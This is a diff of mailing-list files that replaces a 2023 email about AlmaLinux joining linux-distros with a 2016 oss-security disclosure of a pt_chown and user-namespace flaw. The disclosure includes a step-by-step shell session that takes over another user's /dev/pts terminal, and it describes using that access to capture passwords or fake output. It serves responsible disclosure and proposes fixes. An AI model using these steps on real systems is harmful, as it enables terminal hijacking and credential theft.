@@ -1,4 +1,9 @@
-Received: (qmail 1128 invoked by uid 550); 21 Dec 2023 21:23:44 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5010" "Tuesday" "23" "February" "2016" "12:03:54" "+0000" "halfdog" "me@halfdog.net" "<8fc639ad-daef-1a6f-facf-140eb61aeee5@halfdog.net>" "144" "[oss-security] Access to /dev/pts devices via pt_chown and user namespaces" "^Date:" nil nil "2" "2016022312:03:54" "[oss-security] Access to /dev/pts devices via pt_chown and user namespaces" (number mark "U       me@halfdog.n Feb 23  144/5010  " thread-indent "\"[oss-security] Access to /dev/pts devices via pt_chown and user namespaces\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 11507 invoked by uid 550); 23 Feb 2016 12:09:58 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,49 +11,159 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 11299 invoked from network); 23 Feb 2016 12:09:18 -0000
+Message-ID: <8fc639ad-daef-1a6f-facf-140eb61aeee5@halfdog.net>
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+Date: Tue, 23 Feb 2016 12:03:54 +0000
+From: halfdog <me@halfdog.net>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32617 invoked from network); 21 Dec 2023 21:23:29 -0000
-Date: Thu, 21 Dec 2023 22:24:10 +0100
-From: Solar Designer <solar@openwall.com>
-To: Jonathan Wright <jonathan@almalinux.org>
-Cc: oss-security@lists.openwall.com,
-	Andrew Lukoshko <alukoshko@almalinux.org>,
-	benny Vasquez <benny@almalinux.org>,
-	Igor Seletskiy <iseletsk@almalinux.org>,
-	Darya Malyavkina <dmalyavkina@cloudlinux.com>,
-	Jack Aboutboul <jack@almalinux.org>
-Message-ID: <20231221212410.GA800@openwall.com>
-References: <CAKe4=-LwgzB3e1gkwLuTmbMBGW4-L0-4=JVQ_ry1SWXNE266zA@mail.gmail.com> <20231217205642.GA7164@openwall.com> <CAKe4=-KBsSnPfCDKApdOq9uksfv=AenjWtKPZorRcKo3F+_SEA@mail.gmail.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAKe4=-KBsSnPfCDKApdOq9uksfv=AenjWtKPZorRcKo3F+_SEA@mail.gmail.com>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] AlmaLinux Distros List Application
+Subject: [oss-security] Access to /dev/pts devices via pt_chown and user namespaces
+To: oss-security@lists.openwall.com
 
-Hi,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-I think this application does meet the bar for linux-distros membership,
-and everyone had enough opportunity to comment by now.  So I'll proceed
-to subscribe Jonathan and Andrew, and list AlmaLinux OS Foundation as a
-member.  I'll take this off-list for the PGP keys, etc.
+Sending content from [0] also to oss-security as requested last time:
 
-On Tue, Dec 19, 2023 at 04:49:16PM -0600, Jonathan Wright wrote:
-> On Sun, Dec 17, 2023 at 2:56???PM Solar Designer <solar@openwall.com> wrote:
-> > maybe you'd volunteer for some of the tasks from the
-> > "Administrative tasks mostly unrelated to (linux-)distros lists (but
-> > relevant to the wider community)" category?  This category is
-> > essentially about expanding and improving the public oss-security
-> > content and its visibility.
-> 
-> We very likely would be happy to help in this regard, especially if much of
-> it can be done without necessarily being on the private side of the list.
-> The folks on our side that would be great at this type of work are not the
-> same as those of us (myself and Andrew) that would be on the embargoed list.
 
-Great.  It doesn't have to be the same folks who are on linux-distros.
-So please take a look and choose specific task(s).
+Problem description:
+====================
 
-Thanks,
+With Ubuntu Wily and earlier, /usr/lib/pt_chown was used to change
+ownership of slave pts devices in /dev/pts to the same uid holding the
+master file descriptor for the slave. This is done using the pt_chown
+SUID binary, which invokes the ptsname function on the master-fd, thus
+again performing a TIOCGPTN ioctl to get the slave pts number. Using
+the result from the ioctl, the pathname of the slave pts is
+constructed and chown invoked on it, see login/programs/pt_chown.c:
 
-Alexander
+  pty = ptsname (PTY_FILENO);
+  if (pty == NULL)
+    ...
+  /* Get the group ID of the special `tty' group.  */
+  p = getgrnam (TTY_GROUP);
+  gid = p ? p->gr_gid : getgid ();
+
+  /* Set the owner to the real user ID, and the group to that special
+     group ID.  */
+  if (chown (pty, getuid (), gid) < 0)
+    return FAIL_EACCES;
+
+  /* Set the permission mode to readable and writable by the owner,
+     and writable by the group.  */
+  if ((st.st_mode & ACCESSPERMS) != (S_IRUSR|S_IWUSR|S_IWGRP)
+      && chmod (pty, S_IRUSR|S_IWUSR|S_IWGRP) < 0)
+    return FAIL_EACCES;
+
+  return 0;
+
+The logic above is severely flawed, when there can be more than one
+master/slave pair having the same number and thus same name. But this
+condition can be easily created by creating an user namespace,
+mounting devpts with the newinstance option, create master and slave
+pts pairs until the number overlaps with a target pts outside the
+namespace on the host, where there is interest to gain ownership and
+then invoke pt_chown.
+
+Methods:
+========
+
+Exploitation is trivial: At first use any user namespace demo to
+create the namespace needed, e.g. UserNamespaceExec.c and work with
+standard shell commands, e.g. to take over /dev/pts/0:
+
+test# who am I
+test    pts/1        2015-12-27 12:00
+test# ./UserNamespacesExec -- /bin/bash
+Setting uid map in /proc/5783/uid_map
+Setting gid map in /proc/5783/gid_map
+euid: 0, egid: 0
+euid: 0, egid: 0
+root# mkdir mnt
+root# mount -t devpts -o newinstance /dev/pts mnt
+root# cd mnt
+root# chmod 0666 ptmx
+
+Use a second shell to continue:
+
+test# cd /proc/5783/cwd
+test# ls -al
+total 4
+drwxr-xr-x 2 root  root     0 Dec 27 12:48 .
+drwxr-xr-x 7 test users 4096 Dec 27 11:57 ..
+c--------- 1 test users 5, 2 Dec 27 12:48 ptmx
+test# exec 3<>ptmx
+test# ls -al
+total 4
+drwxr-xr-x 2 root  root       0 Dec 27 12:48 .
+drwxr-xr-x 7 test users   4096 Dec 27 11:57 ..
+crw------- 1 test users 136, 0 Dec 27 12:53 0
+crw-rw-rw- 1 test users   5, 2 Dec 27 12:48 ptmx
+test# ls -al /dev/pts/0
+crw--w---- 1 root tty 136, 1 Dec 27  2015 /dev/pts/0
+test# /usr/lib/pt_chown
+test# ls -al /dev/pts/0
+crw--w---- 1 test tty 136, 1 Dec 27 12:50 /dev/pts/0
+
+On systems where the TIOCSTI-ioctl is not prohibited, the tools from
+TtyPushbackPrivilegeEscalation to directly inject code into a shell
+using the pts device. This is not the case at least on Ubuntu Wily.
+But as reading and writing to the pts is allowed, the malicious user
+can not intercept all keystrokes and display faked output from
+commands never really executed. Thus he could lure the user into a)
+change his password or attempt to invoke su/sudo or b) simulate a
+situation, where user's next step is predictable and risky and then
+stop reading the pts, thus making user to execute a command in
+completely unexpected way.
+
+Results, Discussion:
+====================
+
+As already mentioned in [1], exposure of essential OS functionality,
+previously just invoked by really privileged processes, to now
+unprivileged users via user namespaces greatly increases the attack
+surface and thus is a very interesting target for exploit development.
+
+In my opinion, this security bug should be fixed two-fold: At first,
+kernel should prevent the TIOCGPTN ioctl when invoked called by a
+process within one namespace but acting on a filedescriptor from a
+devpts instance mounted in a different namespace. Additionally
+pt_chown should check via readlink and stat, that the passed file
+descriptor really was from the /dev/ptmx or /dev/pts/ptmx device
+present in the same namespace as the /dev/pts/[num] device is
+residing. This of course is only relevant if pt_chown is going to
+survive on recent namespace aware systems.
+
+Timeline:
+=========
+
+    20151220: Discovery
+    20151227: Report at Ubuntu Launchpad1529486
+    20160104: Report to distros list
+    20160122: Patch to disable unprivileged userns due to this and
+other issues LKML
+    20160222: CRD and publication
+
+References:
+===========
+
+[0]
+http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/
+[1]
+http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/
+
+hd
+
+- -- 
+http://www.halfdog.net/
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iEYEARECAAYFAlbMSpgACgkQxFmThv7tq+53VgCdEHpGBl00dQi23z1jEz+wG+dk
+lK4AniINDh7dx9Oe6NXn5KiaFBGstw5O
+=scxD
+-----END PGP SIGNATURE-----
